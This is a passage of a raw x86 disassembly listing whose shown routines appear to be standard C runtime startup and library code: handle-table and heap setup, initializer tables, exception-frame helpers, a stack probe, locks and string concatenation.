  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
